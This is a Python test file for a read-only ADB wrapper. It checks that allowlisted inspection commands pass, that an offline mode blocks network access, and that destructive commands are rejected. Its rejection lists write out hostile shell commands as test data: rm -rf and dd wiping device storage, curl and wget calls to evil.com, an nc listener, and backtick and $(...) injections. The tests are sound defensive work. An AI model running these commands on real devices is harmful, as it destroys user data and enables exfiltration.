"""
Automated Security and Allowlist Tests for ADB Read-Only Wrapper.
Verifies that only read-only allowlisted commands can execute,
and all destructive or write operations are rejected.
"""
import pytest
from utils.adb import ADBClient, ALLOWED_ADB_TOP_LEVEL_COMMANDS, ALLOWED_SHELL_BINARIES
from utils.network_guard import enable_offline_mode, is_offline_mode_active

def test_approved_adb_commands():
    client = ADBClient(dry_run=True)

    approved = [
        ["version"],
        ["devices", "-l"],
        ["-s", "DEVICE123", "shell", "getprop"],
        ["-s", "DEVICE123", "shell", "df -h /sdcard /storage/emulated/0 2>/dev/null || df /sdcard"],
        ["-s", "DEVICE123", "shell", "getenforce 2>/dev/null"],
        ["-s", "DEVICE123", "shell", "which su 2>/dev/null"],
        ["-s", "DEVICE123", "shell", "ls -d /storage/emulated/0 2>/dev/null"],
        ["-s", "DEVICE123", "shell", "ls -l /storage/emulated/0 2>/dev/null | head -n 30"],
        ["-s", "DEVICE123", "shell", "find '/storage/emulated/0/DCIM' -type f 2>/dev/null | wc -l"],
        ["-s", "DEVICE123", "shell", "stat -c '%s' 'sample.db' 2>/dev/null || wc -c < 'sample.db'"],
        ["-s", "DEVICE123", "pull", "/storage/emulated/0/DCIM/photo.jpg", "recovered/photo.jpg"]
    ]

    for cmd in approved:
        # Must not raise PermissionError
        client.validate_adb_command(cmd)

def test_blocked_destructive_and_unauthorized_commands():
    client = ADBClient(dry_run=True)

    unauthorized = [
        ["root"],
        ["remount"],
        ["install", "payload.apk"],
        ["uninstall", "com.whatsapp"],
        ["push", "local_file.txt", "/sdcard/remote.txt"],
        ["reboot", "bootloader"],
        ["fastboot", "devices"],
        ["-s", "DEVICE123", "shell", "rm -rf /storage/emulated/0/DCIM"],
        ["-s", "DEVICE123", "shell", "rmdir /storage/emulated/0/DCIM"],
        ["-s", "DEVICE123", "shell", "chmod 777 /data"],
        ["-s", "DEVICE123", "shell", "chown root:root /data"],
        ["-s", "DEVICE123", "shell", "setprop persist.sys.usb.config adb"],
        ["-s", "DEVICE123", "shell", "dd if=/dev/zero of=/dev/block/bootdevice/by-name/userdata"],
        ["-s", "DEVICE123", "shell", "touch /storage/emulated/0/pwned.txt"],
        ["-s", "DEVICE123", "shell", "mkdir /storage/emulated/0/injected"],
        ["-s", "DEVICE123", "shell", "cp /sdcard/a /sdcard/b"],
        ["-s", "DEVICE123", "shell", "mv /sdcard/a /sdcard/b"],
        ["-s", "DEVICE123", "shell", "echo test > /sdcard/leak.txt"],
        ["-s", "DEVICE123", "shell", "cat /data/system/packages.list >> /sdcard/out.txt"],
        ["-s", "DEVICE123", "shell", "sh -c 'evil'"],
        ["-s", "DEVICE123", "shell", "curl http://evil.com/leak"],
        ["-s", "DEVICE123", "shell", "wget http://evil.com/script.sh"],
        ["-s", "DEVICE123", "shell", "nc -l 1337"],
    ]

    for cmd in unauthorized:
        with pytest.raises(PermissionError) as exc_info:
            client.validate_adb_command(cmd)
        assert "Violation" in str(exc_info.value) or "blocked" in str(exc_info.value)

def test_dry_run_mode_never_spawns_process():
    client = ADBClient(dry_run=True)
    res = client.run_command(["-s", "DEVICE123", "shell", "getprop"])
    assert res.returncode == 0
    assert "[DRY-RUN-SIMULATED-OUTPUT]" in res.stdout

def test_offline_mode_blocks_network():
    enable_offline_mode()
    assert is_offline_mode_active() is True

    import socket
    # 1. TCP connect
    with pytest.raises(PermissionError) as exc_info:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("8.8.8.8", 53))
    assert "Offline Security Guard" in str(exc_info.value)

    # 2. DNS getaddrinfo
    with pytest.raises(PermissionError) as exc_info:
        socket.getaddrinfo("google.com", 80)
    assert "Offline Security Guard" in str(exc_info.value)

    # 3. DNS gethostbyname
    with pytest.raises(PermissionError) as exc_info:
        socket.gethostbyname("example.com")
    assert "Offline Security Guard" in str(exc_info.value)

    # 4. UDP sendto
    with pytest.raises(PermissionError) as exc_info:
        s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s_udp.sendto(b"exfiltration", ("8.8.8.8", 53))
    assert "Offline Security Guard" in str(exc_info.value)

def test_command_substitution_and_chaining_blocked():
    """Regression test: verifies that backticks, subshells, and newlines cannot bypass allowlist."""
    client = ADBClient(dry_run=True)

    injections = [
        ["-s", "DEVICE123", "shell", "ls `rm -rf /`"],
        ["-s", "DEVICE123", "shell", "ls $(reboot)"],
        ["-s", "DEVICE123", "shell", "ls /sdcard\nrm -rf /sdcard"],
        ["-s", "DEVICE123", "shell", "ls /sdcard\rrm -rf /sdcard"],
        ["flash", "boot", "boot.img"],
        ["erase", "userdata"],
        ["sideload", "update.zip"],
        ["-s", "DEVICE123", "shell", "disable-verity"],
        ["-s", "DEVICE123", "shell", "unlock bootloader"],
    ]

    for inj in injections:
        with pytest.raises(PermissionError) as exc_info:
            client.validate_adb_command(inj)
        assert "Violation" in str(exc_info.value) or "blocked" in str(exc_info.value)

